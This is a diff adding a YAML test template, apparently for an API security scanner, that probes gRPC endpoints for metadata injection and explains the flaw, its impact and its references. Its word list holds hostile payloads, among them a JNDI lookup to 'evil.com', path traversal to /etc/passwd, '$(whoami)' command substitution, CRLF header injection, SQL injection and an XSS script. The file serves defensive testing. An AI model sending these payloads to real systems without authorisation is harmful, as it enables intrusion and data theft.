@@ -1,0 +1,101 @@
+id: GRPC_METADATA_INJECTION
+info:
+  name: "gRPC Metadata Injection"
+  description: "The gRPC endpoint appears to be vulnerable to metadata injection attacks. Attackers can inject malicious metadata headers that may bypass authentication, manipulate server behavior, or leak sensitive information."
+  details: >
+    "gRPC metadata is equivalent to HTTP headers in traditional REST APIs and is used to pass authentication tokens, tracing information, and other context between client and server. When applications fail to properly validate or sanitize metadata values, attackers can inject malicious content that may:
+    1. Bypass authentication by injecting forged tokens or credentials
+    2. Manipulate server-side logic that relies on metadata values
+    3. Inject special characters or control sequences that cause parsing errors
+    4. Access unauthorized resources by modifying routing or authorization metadata
+    5. Perform header injection attacks similar to HTTP header injection
+    The vulnerability is particularly dangerous in microservices architectures where metadata is used for service-to-service authentication and authorization decisions."
+  impact: "Successful exploitation can lead to authentication bypass, unauthorized access to resources, privilege escalation, information disclosure, and potential remote code execution in severe cases."
+  category:
+    name: INPUT
+    shortName: Input Validation
+    displayName: Input Validation (INPUT)
+  subCategory: GRPC_METADATA_INJECTION
+  severity: HIGH
+  tags:
+    - gRPC
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://grpc.io/docs/guides/metadata/"
+    - "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
+  cwe:
+    - CWE-20
+    - CWE-74
+    - CWE-113
+  cve:
+    - CVE-2023-32731
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  request_headers:
+    for_one:
+      key:
+        regex: "content-type"
+      value:
+        contains_either:
+          - "application/grpc"
+  response_payload:
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - invalid metadata
+
+wordLists:
+  maliciousMetadata:
+    - "admin\r\nX-Forwarded-For: 127.0.0.1"
+    - "../../../etc/passwd"
+    - "${jndi:ldap://evil.com/a}"
+    - "1' OR '1'='1"
+    - "<script>alert('xss')</script>"
+    - "../../secrets/token"
+    - "\x00\x00\x00\x00"
+    - "$(whoami)"
+
+execute:
+  type: single
+  requests:
+    - req:
+        - add_header:
+            x-custom-metadata: ${maliciousMetadata}
+        - add_header:
+            grpc-metadata-user-role: ${maliciousMetadata}
+        - add_header:
+            grpc-metadata-auth-token: ${maliciousMetadata}
+
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - "invalid"
+      - "malformed"
+      - "rejected"
+      - "blocked"
+      - "WAF"
+      - "Security Exception"
